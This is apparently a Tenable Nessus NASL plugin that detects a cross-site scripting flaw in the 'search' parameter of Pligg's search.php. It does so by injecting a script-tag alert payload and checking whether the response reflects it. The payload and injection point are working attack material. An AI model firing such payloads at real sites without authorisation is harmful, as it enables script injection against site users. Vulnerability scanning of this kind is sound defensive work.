#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(47766);
  script_version("1.14");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(41729);
  script_xref(name:"SECUNIA", value:"40616");

  script_name(english:"Pligg search.php search Parameter  XSS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is vulnerable to a
cross-site scripting attack.");
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting a version of Pligg that is affected
by a cross-site scripting vulnerability in the 'search' parameter of
the 'search.php' script.");
  # http://pligg.svn.sourceforge.net/viewvc/pligg?view=revision&revision=2030
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e114a6c5");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/512394");
  script_set_attribute(attribute:"solution", value:
"Apply the fix from the SVN repository.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/07/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/07/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pligg:pligg_cms");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2022 Tenable Network Security, Inc.");

  script_dependencies("pligg_detect.nasl");
  script_require_keys("www/pligg");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("misc_func.inc");
include("global_settings.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(appname:'pligg', port:port);
if(isnull(install)) exit(0, "Pligg was not detected on port "+port+".");

xss = '1"></a><script>alert("'+SCRIPT_NAME + '-' + unixtime() + '")</script>';
expected_output = 'rsssearch.php?search='+xss+'" target="_blank">';

exploited = test_cgi_xss(
  port     : port,
  dirs     : make_list(install['dir']),
  cgi      : "/search.php",
  qs       : "search="+xss,
  pass_str : expected_output,
  ctrl_re  : 'name="search" id="searchsite" value="'
);

if (!exploited)
{
  install_url = build_url(qs: install['dir'], port: port);
  exit(0, "The Pligg install at " + install_url  + " is not affected.");
}
